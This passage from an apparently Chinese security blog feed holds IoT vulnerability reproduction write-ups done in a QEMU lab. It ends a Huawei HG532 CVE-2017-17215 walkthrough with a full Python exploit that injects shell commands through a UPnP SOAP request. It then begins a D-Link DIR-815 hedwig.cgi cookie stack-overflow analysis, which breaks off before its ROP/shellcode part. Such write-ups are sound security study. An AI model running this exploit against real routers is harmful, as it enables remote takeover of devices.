<span class="title function_">now</span> <span class="params">(man-in-the-middle attack)</span>! It is also possible that a host key has just been changed. The fingerprint <span class="keyword">for</span> the RSA key sent by the remote host is SHA256:RnbVx6INRUINQfGBLb+TCS67dvjyDDo+XXf0MUxPK/c. Please contact your system administrator. Add correct host key in /home/xidp/.ssh/known_hosts to get rid of this message. Offending RSA key in /home/xidp/.ssh/known_hosts:1 remove with: ssh-keygen -f &#x27;/home/xidp/.ssh/known_hosts&#x27; -R &#x27;192.168.52.141&#x27; Host key <span class="keyword">for</span> 192.168.52.141 has changed and you have requested strict checking. Host key verification failed.</span><br></pre></td></tr></table></figure><p>我们可以执行下面命令删除本地旧的密钥记录然后重新进行连接获取密钥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 删除旧密钥记录（自动操作） </span><br><span class="line">ssh-keygen -f <span class="string">&#x27;/home/xidp/.ssh/known_hosts&#x27;</span> -R <span class="string">&#x27;192.168.52.141&#x27;</span> </span><br><span class="line"></span><br><span class="line"># 重新连接（会提示接受新密钥） </span><br><span class="line">ssh -o HostKeyAlgorithms=ssh-rsa root@<span class="number">192.168</span><span class="number">.52</span><span class="number">.141</span></span><br></pre></td></tr></table></figure><p>然后使用 <code>scp命令</code> 将 <code>Ubuntu物理机</code> 中的 <code>squashfs-root</code> 文件传入到 <code>qemu虚拟机</code> 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -o HostKeyAlgorithms=ssh-rsa -r ./squashfs-root root@<span class="number">192.168</span>.xx.xx:/root/</span><br></pre></td></tr></table></figure><p>按照官方报告中所说我们需要打开 <code>37215</code>端口，并对该端口下的 <code>/ctrlt/DeviceUpgrade_1</code> 地址发送数据包，然后我们就可以利用设备内置的 <code>UPnP</code> 服务</p><p>下面我们使用 <code>grep -r &#39;37215&#39;</code> 命令，我们可以发现文件中的 <code>/bin/mic</code> 这个文件中含有这个端口，所以我们可以通过这个文件来打开 <code>37215</code> 端口<br><img src="/../picture/CVE-2017-17215%E5%8D%8E%E4%B8%BAHG532%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png"></p><p>我们返回到 <code>qemu虚拟机</code> 中，然后进入其中的 <code>squashfs-root</code> 文件夹，使用命令 <code>chroot . sh</code> 然后进入 <code>/bin</code> 文件夹，随后使用 <code>./mic</code> 来运行程序开启端口</p><p>然后我们返回 <code>Ubuntu物理机</code> 使用 <code>nc -vv 192.168.52.141 37215</code> 来查看是否能够成功连接上这个端口<br><img src="/../picture/CVE-2017-17215%E5%8D%8E%E4%B8%BAHG532%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png"></p><p>下面编写exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">Authorization = <span class="string">&quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;Authorization&quot;</span>: Authorization&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-----CVE-2017-17215 HUAWEI HG532 RCE-----\n&quot;</span>)</span><br><span class="line">cmd = <span class="built_in">input</span>(<span class="string">&quot;command &gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="string">&lt;s:Envelope s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;s:Body&gt;</span></span><br><span class="line"><span class="string">        &lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;NewStatusURL&gt;XiDP&lt;/NewStatusURL&gt;</span></span><br><span class="line"><span class="string">            &lt;NewDownloadURL&gt;;<span class="subst">&#123;cmd&#125;</span>;&lt;/NewDownloadURL&gt;</span></span><br><span class="line"><span class="string">        &lt;/u:Upgrade&gt;</span></span><br><span class="line"><span class="string">    &lt;/s:Body&gt;</span></span><br><span class="line"><span class="string">&lt;/s:Envelope&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">&#x27;http://192.168.52.141:37215/ctrlt/DeviceUpgrade_1&#x27;</span>, headers = headers, data = data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nstatus_code: &quot;</span> + <span class="built_in">str</span>(r.status_code))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + r.text)</span><br></pre></td></tr></table></figure><p>下面这是运行 <code>./mic</code> 的窗口(这个图中我已经执行了一次exp，并且执行了 <code>ls</code> 命令)<br><img src="/../picture/CVE-2017-17215%E5%8D%8E%E4%B8%BAHG532%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png"></p><p>下面这是执行exp的情况<br><img src="/../picture/CVE-2017-17215%E5%8D%8E%E4%B8%BAHG532%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png"><br>这是执行了上面这次exp之后 <code>./mic</code> 窗口的情况出现了新的内容，虽然我们没有办法通过exp窗口查看，但是我们可以确定我们的命令是成功执行的<br><img src="/../picture/CVE-2017-17215%E5%8D%8E%E4%B8%BAHG532%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png"></p><p>最后我们成功复现了 <code>CVE-2017-17215</code> 漏洞</p><p>参考:<br><a href="https://www.iotsec-zone.com/article/384#d-link-%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E">一些经典IoT漏洞的分析与复现（新手向） - IOTsec-Zone</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IOT </tag>
            
            <tag> CVE </tag>
            
            <tag> 路由器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DIR-815 栈溢出漏洞(CNVD-2013-11625)复现</title>
      <link href="/2025/06/14/DIR-815%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/06/14/DIR-815%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="复现环境及所需工具"><a href="#复现环境及所需工具" class="headerlink" title="复现环境及所需工具"></a><strong>复现环境及所需工具</strong></h2><h3 id="漏洞复现环境"><a href="#漏洞复现环境" class="headerlink" title="漏洞复现环境"></a><strong>漏洞复现环境</strong></h3><p><code>Ubuntu 24.04.2 LTS</code><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/1.png"></p><h3 id="基础工具配置"><a href="#基础工具配置" class="headerlink" title="基础工具配置"></a><strong>基础工具配置</strong></h3><p>基础的Pwn环境 + binwalk + sasquatch + qemu<br>pwn环境配置推荐YX-hueimie师傅的博客<br><a href="https://blog.csdn.net/j284886202/article/details/139352067?spm=1001.2014.3001.5502">★pwn 24.04环境搭建保姆级教程★_ubuntu24 pwn-CSDN博客</a><br><a href="https://blog.csdn.net/j284886202/article/details/134931709?spm=1001.2014.3001.5502">★pwn 22.04环境搭建保姆级教程★_pwn环境搭建-CSDN博客</a></p><p>安装binwalk可以直接使用apt安装，也可以下载binwalk的源码来自己编译</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install binwalk</span><br></pre></td></tr></table></figure><p><code>sasquatch</code> 是<code>binwalk</code>用于解压<code>非标准SquashFS文件系统</code>的关键依赖(入门不安装这个那么我们之后binwalk分解固件会发现里面 <code>squashfs-root</code> 文件夹是空的)<br>安装方法如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 安装依赖库（关键步骤，否则编译会失败） </span><br><span class="line">sudo apt-get install build-essential zlib1g-dev liblzma-dev liblzo2-dev </span><br><span class="line"># 克隆仓库并编译 </span><br><span class="line">git clone https:<span class="comment">//github.com/devttys0/sasquatch.git </span></span><br><span class="line">cd sasquatch </span><br><span class="line">./build.sh</span><br></pre></td></tr></table></figure><p>如果遇到下面问题，请按照下面文章中的方法解决</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unsquashfs.c:<span class="number">1835</span>:<span class="number">5</span>: error: this ‘<span class="keyword">if</span>’ clause does not guard... [-Werror=misleading-indentation]</span><br><span class="line"> <span class="number">1835</span> |     <span class="keyword">if</span>(swap)</span><br><span class="line">      |     ^~</span><br><span class="line">unsquashfs.c:<span class="number">1841</span>:<span class="number">9</span>: note: ...this statement, but the latter is misleadingly indented as <span class="keyword">if</span> it were guarded by the ‘<span class="keyword">if</span>’</span><br><span class="line"> <span class="number">1841</span> |         read_fs_bytes(fd, SQUASHFS_START, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> squashfs_super_block),</span><br><span class="line">      |         ^~~~~~~~~~~~~</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_50883855/article/details/132496258?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522dba4ca36aeb250d8e0b75418bf396d5f%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=dba4ca36aeb250d8e0b75418bf396d5f&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-132496258-null-null.142%5Ev102%5Epc_search_result_base4&utm_term=binwalk%E5%AE%89%E8%A3%85sasquatch&spm=1018.2226.3001.4187">binwalk缺少sasquatch报错_unsquashfs.c:1835:5: error: this ‘if’ clause does -CSDN博客</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone --quiet --depth <span class="number">1</span> --branch <span class="string">&quot;master&quot;</span> https:<span class="comment">//github.com/devttys0/sasquatch</span></span><br><span class="line">cd sasquatch</span><br><span class="line">wget https:<span class="comment">//github.com/devttys0/sasquatch/pull/51.patch &amp;&amp; patch -p1 &lt;51.patch</span></span><br><span class="line">sudo ./build.sh</span><br></pre></td></tr></table></figure><p>上面问题解决可能还存在下面问题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LZMA/lzma465/C/LzmaEnc.c: In function ‘LzmaEnc_CodeOneMemBlock’: LZMA/lzma465/C/LzmaEnc.c:<span class="number">2161</span>:<span class="number">19</span>: error: storing the address of local variable ‘outStream’ in ‘*(CLzmaEnc *)pp.rc.outStream’ [-Werror=dangling-pointer=] <span class="number">2161</span> | p-&gt;rc.outStream = &amp;outStream.funcTable; | ~~~~~~~~~~~~~~~~^~~~~~~~~~~~~~~~~~~~~~ LZMA/lzma465/C/LzmaEnc.c:<span class="number">2145</span>:<span class="number">20</span>: note: ‘outStream’ declared here <span class="number">2145</span> | CSeqOutStreamBuf outStream; | ^~~~~~~~~ LZMA/lzma465/C/LzmaEnc.c:<span class="number">2139</span>:<span class="number">45</span>: note: ‘pp’ declared here <span class="number">2139</span> | SRes <span class="title function_">LzmaEnc_CodeOneMemBlock</span><span class="params">(CLzmaEncHandle pp, Bool reInit, | ~~~~~~~~~~~~~~~^~ cc1: all warnings being treated as errors make: *** [&lt;builtin&gt;: LZMA/lzma465/C/LzmaEnc.o] Error <span class="number">1</span></span></span><br></pre></td></tr></table></figure><p>我们需要修改build.sh文件来防止这个错误</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># ...（前面部分不变）</span><br><span class="line"></span><br><span class="line"># Patch, build, and install the source</span><br><span class="line">cd squashfs4<span class="number">.3</span></span><br><span class="line">patch -p0 &lt; ../patches/patch0.txt</span><br><span class="line">cd squashfs-tools</span><br><span class="line">export CFLAGS=<span class="string">&quot;-Wno-error=dangling-pointer&quot;</span>  # 关键修改</span><br><span class="line">make &amp;&amp; $SUDO make install</span><br></pre></td></tr></table></figure><p>安装完成后就可以使用 <code>binwalk -Me &lt;文件地址&gt;</code> 来对文件进行分解了,进入分解后的文件夹可以看到很多 <code>www</code> <code>bin</code> <code>usr</code> 等等文件夹，最重要的是还有一个 <code>squashfs-root</code>文件夹 </p><p>分解过程中还可能出现软连接有问题，比如我们进入 <code>squashfs-root</code> 文件夹中我们使用 <code>ls -la</code> 指令<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/2.png"><br>这里就发现了一个软连接缺失，指向的是 我们Ubuntu的 <code>/tmp</code> 目录（实际上应该指向路由器的 <code>/tmp</code> 目录，而不是本机的 <code>/tmp</code> 目录），为了安全考虑，<code>binwalk</code> 将这种软链接都置成了 <code>/dev/null</code></p><p>这里我们需要恢复成正常的样子，如果放任不管可能导致后续的模拟失败<br>修改方法为<br>进入到 <code>/usr/lib/python3/dist-packages/binwalk/modules</code> 目录下(如果是apt下载的话)<br>修改其中的 <code>extractor.py</code> 文件修改为下图所示，当然先保留原本的文件最好，万一改错了还可以再改回来<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/3.png"><br>具体修改方法参照下面两篇博客<br><a href="https://www.uf4te.cn/posts/3fd254db.html#%E5%AE%89%E8%A3%85-binwalk">IOT环境搭建与固件分析 | 坠入星野的月🌙</a><br><a href="https://zikh26.github.io/posts/d1f081a9.html?highlight=mips">https://zikh26.github.io/posts/d1f081a9.html?highlight=mips</a></p><p>修改好后解压就不是 <code>/dev/null</code> 如下图所示<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/4.png"></p><p>还有一个坑，就是很多时候为了方便我们可能会创建Windows和Ubutnu的共享文件夹，然后将共享文件夹从 <code>/mnt/hgfs/</code> 目录下使用ln指令链接到Ubuntu桌面或者别的什么地方，这里需要注意，如果这么做了就不要在这个共享文件夹里面使用binwalk，因为这样会导致binwalk无法创建软连接，笔者在这里踩坑花费了很多时间</p><p>安装qemu虚拟机</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu </span><br><span class="line">sudo apt-get install qemu-user-<span class="type">static</span></span><br><span class="line">sudo apt-get install qemu-system</span><br></pre></td></tr></table></figure><h2 id="漏洞基本介绍"><a href="#漏洞基本介绍" class="headerlink" title="漏洞基本介绍"></a><strong>漏洞基本介绍</strong></h2><p>本次复现的CNVD漏洞报告地址:<a href="https://www.cnvd.org.cn/flaw/show/CNVD-2013-11625">国家信息安全漏洞共享平台</a></p><p>根据官方报告可知<code>DIR-645</code>型号的<code>hedwig.cgi</code>中会存在缓冲区溢出的漏洞<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/5.png"></p><p><code>固件包（见附件）:DIR815A1_FW103b01.bin</code></p><h2 id="分离固件"><a href="#分离固件" class="headerlink" title="分离固件"></a><strong>分离固件</strong></h2><p>将我们的固件包放入到我们配置好环境的Ubuntu虚拟机中<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/6.png"></p><p>使用指令 <code>binwalk -Me DIR815A1_FW103b01.bin</code> 来分解它<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/7.png"></p><p>分解之后当前文件夹下面会出现一个 <code>_DIR815A1_FW103b01.bin.extracted</code> 文件，也就是我们分解后的程序，根据官网的报告我们已经知道漏洞点在 <code>hedwig.cgi</code> 中所以我们就需要去找这个文件在哪，我们进入我们分解之后的 <code>_DIR815A1_FW103b01.bin.extracted/squashfs-root</code> 中，然后使用find指令来查找，得知它在 <code>_DIR815A1_FW103b01.bin.extracted/squashfs-root/htdocs/web</code> 目录下<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/8.png"></p><p>进入该目录后我们发现这个 <code>hedwig.cgi</code> 它其实是一个软连接，我们使用 <code>ls -la</code> 指令来查看就会发现它的本体其实是 <code>/htdocs/cgibin</code> 这个文件<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/9.png"></p><p>下面我们进入该目录并使用checksec指令来查看该文件的保护机制<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/10.png"></p><p>需要注意的是它的结构为mips而不是我们打pwn常见的amd所以我们需要给IDA安装对应的插件才能分析<br>插件以及安装方法可以参考下面文章:<a href="https://xz.aliyun.com/news/14461">ida mips插件安装+攻防世界ereere题解-先知社区</a><br>笔者使用的为IDA9.0版本，不需要安装该插件，如果上述插件安装失败的话建议安装IDA9.0版本</p><h2 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a><strong>漏洞点分析</strong></h2><p>进入 <code>main函数</code> 中找到 <code>hedwig.cgi</code><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/11.png"></p><p>进入<code>hedwigcgi_main函数</code>中，发现其中规定了<code>post</code>请求方式<br>然后我们继续进入到 <code>cgibin_parse_request函数</code> 中<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/12.png"></p><p>发现里面利用 <code>getenv函数</code> 获取了了三个环境变量, 但是和我们的漏洞没啥关系，只不过利用漏洞的时候这里需要随便输入一些东西作为它们的参数<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/13.png"></p><p>这个函数结束后我们回到<code>hedwigcgi_main函数</code><br>我们发现<code>hedwigcgi_main函数</code>下面会调用 <code>sess_get_uid函数</code>, 我们进入其中查看<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/14.png"></p><p>进入到其中也是可以直接看到它获取了我们的环境变量 <code>COOKIE</code><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/15.png"></p><p>这里获取到了<code>COOKIE</code>之后赋值给了<code>v3</code>，在后续<code>v3</code>又赋值给了<code>v5</code>，再通过指针的形式传递给<code>v7</code>，在通过对特定符号(比如 <code>=</code> <code>；</code> 等符号)的判断对 <code>COOKIE</code> 进行分离<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/16.png"></p><p>再继续往下看 <code>sobj_add_char函数</code> 的功能就和它的函数名字一样，用于添加字符<br>而下面这一段程序的作用就是将 <code>=</code> 前面的内容给 <code>v2</code> 将 <code>=</code> 后面的内容给 <code>v5</code><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/17.png"></p><p>再往下看，这里判断 <code>v2</code> 的内容是不是 <code>uid</code> 判断之后将 <code>v4</code> 的内容放入 <code>string</code> 中，然后再拼接到 <code>a1</code> 里面<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/18.png"><br>所以我们可以得到的结论就是 <code>sess_get_uid函数</code> 的作用就是将 <code>COOKIE</code> 中 <code>uid=</code> 后面的内容提取出来</p><p>再次回到我们的 <code>hedwigcgi_main函数</code> 我们可以看到下面的 <code>sprintf函数</code>，这个 <code>sprintf函数</code> 就是我们的一个漏洞点<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/19.png"></p><p>通过阅读代码逻辑 <code>sprintf函数</code> 的第四个参数 <code>string</code> 其实就是 <code>v4</code> ，而这里的 <code>v4</code> 我们通过上面分析可以得知 <code>v4</code> 其实就是传入的 <code>cookie</code> 中的 <code>uid=</code> 后面的内容，这个部分的内容以及长度其实我们是可以控制的， 而我们的 <code>v27</code> 数组的大小为 <code>1024</code> 所以这里可能存在栈溢出<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/20.png"></p><p>而继续往下阅读代码，在 <code>hedwigcgi_main函数</code> 的 133行同样还有一个 <code>sprintf函数</code>， 同样也是往 <code>v27</code> 这个数组中输入<br>输入的内容 <code>v20</code> 的内容也是 <code>v4</code>，而 <code>v4</code> 从第一个 <code>sprintf函数</code> 到这第二个 <code>sprintf函数</code> 没有发生改变，所以同样 <code>v4</code> 也是 <code>cookie</code> 中的 <code>uid=</code> 后面的内容,所以利用漏洞的时候我们只需要将 <code>cookie</code> 的 <code>uid=</code> 后面的内容当成 <code>payload</code> 来输入就行了<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/21.png"></p><p>在利用漏洞之前我们回到漏洞代码之前，我们发现如果想要利用下面的漏洞，我们还需要考虑绕过下面这两个 <code>if</code>  </p><ol><li>我们必须要有<code>/var/tmp/temp.xml</code> </li><li>这个 <code>haystack</code> 需要为 <code>非0</code><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/22.png"></li></ol><p>绕过 <code>1</code> 的方法: 在我们模拟环境的时候在系统内创建一个<code>/var/tmp</code>文件夹就行<br>绕过 <code>2</code> 的方法: 在 <code>cgibin_parse_request(sub_409A6C, 0, 0x20000);</code> 的 <code>sub_409A6C</code> 中有对 <code>haystack</code> 进行操作<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/23.png"></p><p>而进入 <code>sub_409A6C</code> 的条件为使用<code>POST方式</code>传入内容<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/24.png"></p><p>但是如果需要使用 <code>POST</code> 进行传参就需要进入到 <code>cgibin_parse_request函数</code> 如下图所示的部分<br>这个部分return进行了跳转，调试的时候我们会知道这里是 <code>sub_403b10函数</code><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/25.png"><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/26.png"><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/27.png"></p><p>那么我们进入<code>sub_403b10函数</code>， 接着跟进进入 <code>sub_402FFC函数</code><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/28.png"></p><p>在 <code>sub_402FFC函数</code> 函数中进入 <code>sub_402B40函数</code><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/29.png"></p><p>最终找到下面这段程序<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/30.png"></p><p>通过调试我们可以知道这里的 <code>v9(v10, v16)</code> 其实就是调用了 <code>sub_409A6C函数</code><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/31.png"><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/32.png"></p><p>下面我们回到 <code>hedwigcgi_main函数</code> 在第50行处这里有一个 <code>cgibin_parse_request函数</code> 其中调用了 <code>sub_409A6C函数</code><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/33.png"></p><p>进入到 <code>cgibin_parse_request</code> 之中<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/34.png"><br>这里如果 <code>v9</code> 变成 <code>-1</code> 那么下面就没有办法执行  <code>return ((&amp;off_42C014)[3 * v16 - 1])(a1, a2, v7, &amp;v14[v17]);</code><br>也就是没有办法进入到 <code>sub_403b10函数</code> 那么也就没有办法在 <code>sub_403b10函数</code> 进入 <code>sub_402FFC函数</code> 当中去，所以环境变量<code>REQUEST_URI</code>中也必须有内容才行<br>在后续的exp中我们将这里的环境变量<code>CONTENT_TYPE</code>设置为<code>application/x-www-form-urlencoded</code><br>然后满足这些条件我们就可以利用到第二个 <code>sprintf函数</code> 了</p><p>如果是新手来复现熟悉一下过程的话只需要知道我们可以在exp中通过控制cookie的内容来打栈溢出就可以</p><h2 id="MIPS栈溢出的相关知识和工具"><a href="#MIPS栈溢出的相关知识和工具" class="headerlink" title="MIPS栈溢出的相关知识和工具"></a>MIPS栈溢出的相关知识和工具</h2><p>我们先来捋一下思路，程序什么保护都没有开启，所以我们可以直接 <code>打ROP链来获得shell</code>，还有就是 <code>MIPS架构</code> 是没办法开启 <code>NX保护</code> 的我们可以构造 <code>shellcode</code> 然后返回 <code>shellcode</code> 的地址执行</p><p>当然在实际应用中，最常用的还是通过 <code>ROP + shellcode</code> 的方式来 <code>getshell</code></p><h3 id="构造mips的rop寻找gadget所需的工具"><a 